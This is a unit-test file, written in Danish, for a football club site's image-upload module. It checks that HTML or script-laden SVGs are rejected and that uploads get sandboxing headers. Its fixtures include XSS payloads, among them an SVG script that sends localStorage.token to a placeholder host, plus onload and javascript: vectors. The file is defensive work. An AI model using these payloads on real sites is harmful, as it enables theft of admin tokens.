/**
 * Unit-tests af football-uploads (utils/billedUpload.js) — ingen database.
 *
 * Før blev endelsen taget fra klientens filnavn og typen fra klientens egen
 * angivelse, og /api/uploads serveres på alle klubbers subdomæner: en SVG med
 * <script> kunne åbnes på en anden klubs domæne og læse dens admin-token.
 *
 * Kør: npm run test:unit
 */
const { test, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const express = require('express');
const {
  endelseFraType, billedFilter, erGyldigtBillede, tjekUploadetBillede, kunBilleder, sikreUploadHeadere,
} = require('../../utils/billedUpload');

const PNG = Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex');
const JPG = Buffer.from('ffd8ffe000104a464946', 'hex');
const GIF = Buffer.from('GIF89a......', 'latin1');
const WEBP = Buffer.concat([Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WEBPVP8 ')]);
const SVG = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect width="10" height="10" fill="red"/></svg>');

test('endelsen kommer fra typen — ikke fra filnavnet', () => {
  assert.equal(endelseFraType('image/png'), '.png');
  assert.equal(endelseFraType('image/jpeg'), '.jpg');
  assert.equal(endelseFraType('image/svg+xml'), '.svg');
  assert.equal(endelseFraType('text/html'), null);
});

test('billedFilter: kun billedtyper', () => {
  const svar = (mimetype) => { let r; billedFilter({}, { mimetype }, (err, ok) => { r = err ? 'afvist' : ok; }); return r; };
  assert.equal(svar('image/png'), true);
  assert.equal(svar('image/svg+xml'), true);
  assert.equal(svar('text/html'), 'afvist');
  assert.equal(svar('application/javascript'), 'afvist');
});

test('erGyldigtBillede: rigtige billeder godkendes', () => {
  assert.equal(erGyldigtBillede(PNG, 'image/png'), true);
  assert.equal(erGyldigtBillede(JPG, 'image/jpeg'), true);
  assert.equal(erGyldigtBillede(GIF, 'image/gif'), true);
  assert.equal(erGyldigtBillede(WEBP, 'image/webp'), true);
  assert.equal(erGyldigtBillede(SVG, 'image/svg+xml'), true);
});

test('erGyldigtBillede: HTML forklædt som PNG afvises', () => {
  assert.equal(erGyldigtBillede(Buffer.from('<html><script>alert(1)</script></html>'), 'image/png'), false);
  assert.equal(erGyldigtBillede(PNG, 'image/jpeg'), false);
});

test('erGyldigtBillede: SVG med scripts, event-handlere eller javascript: afvises', () => {
  for (const ond of [
    '<svg><script>fetch("//x?"+localStorage.token)</script></svg>',
    '<svg onload="alert(1)"></svg>',
    '<svg><a href="javascript:alert(1)"><rect/></a></svg>',
    '<svg><foreignObject><iframe src="x"></iframe></foreignObject></svg>',
    '<!DOCTYPE svg [<!ENTITY x "y">]><svg>&x;</svg>',
    '<html><body>ingen svg</body></html>',
  ]) {
    assert.equal(erGyldigtBillede(Buffer.from(ond), 'image/svg+xml'), false, ond);
  }
});

const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'fb-upload-'));
after(() => fs.rmSync(TMP, { recursive: true, force: true }));

test('tjekUploadetBillede: en ugyldig fil slettes, og kaldet afvises med 400', () => {
  const fil = path.join(TMP, 'team_1_1.png');
  fs.writeFileSync(fil, '<script>alert(1)</script>');
  let status = 200, nexted = false;
  const res = { status(c) { status = c; return this; }, json() { return this; } };
  tjekUploadetBillede({ file: { path: fil, mimetype: 'image/png' } }, res, () => { nexted = true; });
  assert.equal(status, 400);
  assert.equal(nexted, false);
  assert.equal(fs.existsSync(fil), false);
});

test('tjekUploadetBillede: et rigtigt billede slipper igennem', () => {
  const fil = path.join(TMP, 'team_1_2.png');
  fs.writeFileSync(fil, PNG);
  let nexted = false;
  tjekUploadetBillede({ file: { path: fil, mimetype: 'image/png' } }, {}, () => { nexted = true; });
  assert.equal(nexted, true);
  assert.equal(fs.existsSync(fil), true);
});

// ── /api/uploads som i server.js ──
const app = express();
fs.mkdirSync(path.join(TMP, 'clubs', '1', 'logos'), { recursive: true });
fs.writeFileSync(path.join(TMP, 'clubs', '1', 'logos', 'gammel.svg'), '<svg onload="alert(1)"></svg>');
fs.writeFileSync(path.join(TMP, 'clubs', '1', 'logos', 'x.html'), '<script>alert(1)</script>');
app.use('/api/uploads', kunBilleder, express.static(TMP, { setHeaders: sikreUploadHeadere }));
const server = app.listen(0);
after(() => server.close());
const url = (p) => `http://127.0.0.1:${server.address().port}${p}`;

test('/api/uploads: billeder serveres med sandbox-CSP og nosniff — også en gammel SVG med script', async () => {
  const r = await fetch(url('/api/uploads/clubs/1/logos/gammel.svg'));
  assert.equal(r.status, 200);
  assert.match(r.headers.get('content-security-policy'), /sandbox/);
  assert.match(r.headers.get('content-security-policy'), /default-src 'none'/);
  assert.equal(r.headers.get('x-content-type-options'), 'nosniff');
});

test('/api/uploads: andet end billeder serveres ikke', async () => {
  assert.equal((await fetch(url('/api/uploads/clubs/1/logos/x.html'))).status, 404);
});
